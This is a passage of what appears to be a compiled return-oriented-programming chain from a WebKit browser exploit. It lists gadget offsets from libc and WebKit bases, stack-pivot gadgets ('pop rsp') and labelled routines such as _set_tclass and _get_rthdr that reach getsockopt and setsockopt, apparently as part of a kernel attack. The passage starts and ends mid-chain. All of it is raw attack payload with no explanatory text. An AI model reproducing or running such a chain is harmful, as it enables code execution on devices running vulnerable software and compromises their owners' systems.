db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+186120,//L2826
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+186104,//L2827
webkit_base+4687784,
libc_base+768796
]);
//L2827:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L2826:
db([0,0]);
//L2782:
set_gadget(libc_base+713278,);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+608613,//pop rdx
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+17972187,//pop r9
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+765305,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
webkit_base+4687784,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+489696,//pop rsp
libc_base+430587,
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967080,4294967295]);// -0xd8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([200,0]);// 0xc8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967088,4294967295]);// -0xd0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([192,0]);// 0xc0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967096,4294967295]);// -0xc8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([184,0]);// 0xb8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967104,4294967295]);// -0xc0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([176,0]);// 0xb0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967112,4294967295]);// -0xb8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([168,0]);// 0xa8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967272,4294967295]);// -0x18
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+772328
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
webkit_base+5236215,//and rax,rcx
libc_base+772328,
getsockopt_addr,
webkit_base+2989859,//mov [rax],rcx
libc_base+713278
]);
db([4294967192,4294967295]);// -0x68
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([48,0]);
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+430587,
libc_base+713278
]);
db([32,0]);// 0x20
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([24,0]);// 0x18
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([128,0]);// 0x80
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+187448,//L2828
webkit_base+4687784,
libc_base+489696 //pop rsp
]);
//L2828:
db([0,0]);
//_set_tclass:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+187520,//L2830
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L2830:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+187592,//L2832
webkit_base+4687784,
libc_base+768796
]);
//L2831:
db([4,0]);// 0x4
set_gadget(webkit_base+1420514,);//pop r8
//L2832:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+187688,//L2834
webkit_base+4687784,
libc_base+713278
]);
//L2833:
db([24,0]);// 0x18
set_gadget(libc_base+768796,);
//L2834:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L2835:
db([61,0]);// 0x3d
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L2836:
db([41,0]);// 0x29
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+187888,//L2839
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2837:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L2839:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+187976,//L2841
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+187992,//L2842
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2841:
db([0,0]);
set_gadget(libc_base+772328,);
//L2842:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+188152,//L2844
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+188184,//L2846
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+188136,//L2843
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+188168,//L2845
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2843:
db([0,0]);
set_gadget(libc_base+165442,);
//L2844:
db([0,0]);
set_gadget(libc_base+772328,);
//L2845:
db([0,0]);
set_gadget(libc_base+768796,);
//L2846:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+188280,//L2848
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+188264,//L2847
webkit_base+4687784,
libc_base+165442
]);
//L2847:
db([0,0]);
set_gadget(libc_base+768796,);
//L2848:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L2850:
ropchain+188384,//L2849
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+189624,//L2851
//L2849:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967256,4294967295]);// -0x28
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+188528,//L2853
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+188544,//L2854
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+188512,//L2852
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2852:
db([0,0]);
set_gadget(libc_base+165442,);
//L2853:
db([0,0]);
set_gadget(libc_base+768796,);
//L2854:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+188672,//L2857
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+188704,//L2859
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+188688,//L2858
webkit_base+4687784,
libc_base+713278
]);
//L2856:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L2857:
db([0,0]);
set_gadget(libc_base+165442,);
//L2858:
db([0,0]);
set_gadget(libc_base+768796,);
//L2859:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+188816,//L2860+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+188808,//L2860
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L2860:
db([0,0]);
set_gadgets([
ropchain+188832,//L2860+24
ropchain+189296,//L2855
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+188904,//L2863
webkit_base+4687784,
libc_base+768796
]);
//L2861:
db([0,0]);
set_gadget(libc_base+165442,);
//L2862:
db([0,0]);
set_gadget(libc_base+772328,);
//L2863:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+189064,//L2865
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+189096,//L2867
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+189048,//L2864
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+189080,//L2866
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2864:
db([0,0]);
set_gadget(libc_base+165442,);
//L2865:
db([0,0]);
set_gadget(libc_base+772328,);
//L2866:
db([0,0]);
set_gadget(libc_base+768796,);
//L2867:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+189176,//L2868
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+189192,//L2869
webkit_base+4687784,
libc_base+165442
]);
//L2868:
db([0,0]);
set_gadget(libc_base+768796,);
//L2869:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+189288,//L2871
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+189272,//L2870
webkit_base+4687784,
libc_base+165442
]);
//L2870:
db([0,0]);
set_gadget(libc_base+768796,);
//L2871:
db([0,0]);
//L2855:
set_gadgets([
libc_base+713278,
ropchain+189376,//L2873
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+189360,//L2872
webkit_base+4687784,
libc_base+165442
]);
//L2872:
db([0,0]);
set_gadget(libc_base+768796,);
//L2873:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+189480,//L2874
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+189496,//L2875
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L2874:
db([0,0]);
set_gadget(libc_base+768796,);
//L2875:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+189616,//L2876
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+189600,//L2877
webkit_base+4687784,
libc_base+768796
]);
//L2877:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L2876:
db([0,0]);
//L2851:
set_gadget(libc_base+713278,);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+608613,//pop rdx
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+17972187,//pop r9
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+765305,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
webkit_base+4687784,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+489696,//pop rsp
libc_base+430587,
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967080,4294967295]);// -0xd8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([200,0]);// 0xc8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967088,4294967295]);// -0xd0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([192,0]);// 0xc0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967096,4294967295]);// -0xc8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([184,0]);// 0xb8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967104,4294967295]);// -0xc0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([176,0]);// 0xb0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967112,4294967295]);// -0xb8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([168,0]);// 0xa8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967272,4294967295]);// -0x18
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+772328
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
webkit_base+5236215,//and rax,rcx
libc_base+772328,
setsockopt_addr,
webkit_base+2989859,//mov [rax],rcx
libc_base+713278
]);
db([4294967192,4294967295]);// -0x68
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([48,0]);
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+430587,
libc_base+713278
]);
db([32,0]);// 0x20
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([24,0]);// 0x18
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([128,0]);// 0x80
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+190944,//L2878
webkit_base+4687784,
libc_base+489696 //pop rsp
]);
//L2878:
db([0,0]);
//_get_rthdr:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+191016,//L2880
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L2880:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+191080,//L2882
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L2882:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2883:
db([32,0]);// 0x20
set_gadget(libc_base+772328,);
//L2885:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+191232,//L2887
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+191248,//L2888
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2887:
db([0,0]);
set_gadget(libc_base+772328,);
//L2888:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+191408,//L2890
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+191440,//L2892
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+191392,//L2889
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+191424,//L2891
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2889:
db([0,0]);
set_gadget(libc_base+165442,);
//L2890:
db([0,0]);
set_gadget(libc_base+772328,);
//L2891:
db([0,0]);
set_gadget(libc_base+768796,);
//L2892:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+191560,//L2896
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+191544,//L2895
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2893:
db([4294967292,4294967295]);// -0x4
set_gadget(libc_base+165442,);
//L2895:
db([0,0]);
set_gadget(libc_base+772328,);
//L2896:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+713278,
ropchain+191640,//L2899
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2897:
db([4294967292,4294967295]);// -0x4
set_gadget(libc_base+772328,);
//L2899:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+191744,//L2902
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2900:
db([24,0]);// 0x18
set_gadget(libc_base+772328,);
//L2902:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+191832,//L2904
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+191848,//L2905
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2904:
db([0,0]);
set_gadget(libc_base+772328,);
//L2905:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+191992,//L2908
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+191960,//L2906
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+191976,//L2907
webkit_base+4687784,
libc_base+165442
]);
//L2906:
db([0,0]);
set_gadget(libc_base+772328,);
//L2907:
db([0,0]);
set_gadget(libc_base+768796,);
//L2908:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L2909:
db([51,0]);// 0x33
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L2910:
db([41,0]);// 0x29
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+192184,//L2913
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2911:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L2913:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+192272,//L2915
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+192288,//L2916
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2915:
db([0,0]);
set_gadget(libc_base+772328,);
//L2916:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+192448,//L2918
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+192480,//L2920
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+192432,//L2917
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+192464,//L2919
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2917:
db([0,0]);
set_gadget(libc_base+165442,);
//L2918:
db([0,0]);
set_gadget(libc_base+772328,);
//L2919:
db([0,0]);
set_gadget(libc_base+768796,);
//L2920:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+192576,//L2922
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+192560,//L2921
webkit_base+4687784,
libc_base+165442
]);
//L2921:
db([0,0]);
set_gadget(libc_base+768796,);
//L2922:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L2924:
ropchain+192680,//L2923
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+194832,//L2925
//L2923:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967256,4294967295]);// -0x28
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+192824,//L2927
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+192840,//L2928
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+192808,//L2926
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2926:
db([0,0]);
set_gadget(libc_base+165442,);
//L2927:
db([0,0]);
set_gadget(libc_base+768796,);
//L2928:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+192968,//L2931
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+193000,//L2933
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+192984,//L2932
webkit_base+4687784,
libc_base+713278
]);
//L2930:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L2931:
db([0,0]);
set_gadget(libc_base+165442,);
//L2932:
db([0,0]);
set_gadget(libc_base+768796,);
//L2933:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+193112,//L2934+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+193104,//L2934
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L2934:
db([0,0]);
set_gadgets([
ropchain+193128,//L2934+24
ropchain+193592,//L2929
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+193200,//L2937
webkit_base+4687784,
libc_base+768796
]);
//L2935:
db([0,0]);
set_gadget(libc_base+165442,);
//L2936:
db([0,0]);
set_gadget(libc_base+772328,);
//L2937:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+193360,//L2939
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+193392,//L2941
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+193344,//L2938
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+193376,//L2940
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2938:
db([0,0]);
set_gadget(libc_base+165442,);
//L2939:
db([0,0]);
set_gadget(libc_base+772328,);
//L2940:
db([0,0]);
set_gadget(libc_base+768796,);
//L2941:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+193472,//L2942
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+193488,//L2943
webkit_base+4687784,
libc_base+165442
]);
//L2942:
db([0,0]);
set_gadget(libc_base+768796,);
//L2943:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+193584,//L2945
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+193568,//L2944
webkit_base+4687784,
libc_base+165442
]);
//L2944:
db([0,0]);
set_gadget(libc_base+768796,);
//L2945:
db([0,0]);
//L2929:
set_gadgets([
libc_base+713278,
ropchain+193648,//L2948
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2946:
db([4294967292,4294967295]);// -0x4
set_gadget(libc_base+772328,);
//L2948:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+193736,//L2950
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+193752,//L2951
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2950:
db([0,0]);
set_gadget(libc_base+772328,);
//L2951:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+193912,//L2953
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+193944,//L2955
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+193896,//L2952
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+193928,//L2954
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2952:
db([0,0]);
set_gadget(libc_base+165442,);
//L2953:
db([0,0]);
set_gadget(libc_base+772328,);
//L2954:
db([0,0]);
set_gadget(libc_base+768796,);
//L2955:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+194104,//L2959
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+194056,//L2956
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+194072,//L2957
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2956:
db([0,0]);
set_gadget(libc_base+165442,);
//L2957:
db([0,0]);
set_gadget(libc_base+772328,);
//L2958:
db([32,0]);// 0x20
set_gadget(libc_base+768796,);
//L2959:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+194240,//L2961
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+194256,//L2962
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+194224,//L2960
webkit_base+4687784,
libc_base+165442
]);
//L2960:
db([0,0]);
set_gadget(libc_base+772328,);
//L2961:
db([0,0]);
set_gadget(libc_base+768796,);
//L2962:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+194360,//L2963
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+194376,//L2964
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L2963:
db([0,0]);
set_gadget(libc_base+768796,);
//L2964:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+194496,//L2965
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+194480,//L2966
webkit_base+4687784,
libc_base+768796
]);
//L2966:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L2965:
db([0,0]);
set_gadgets([
libc_base+713278,
ropchain+194584,//L2968
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+194568,//L2967
webkit_base+4687784,
libc_base+165442
]);
//L2967:
db([0,0]);
set_gadget(libc_base+768796,);
//L2968:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+194688,//L2969
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+194704,//L2970
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L2969:
db([0,0]);
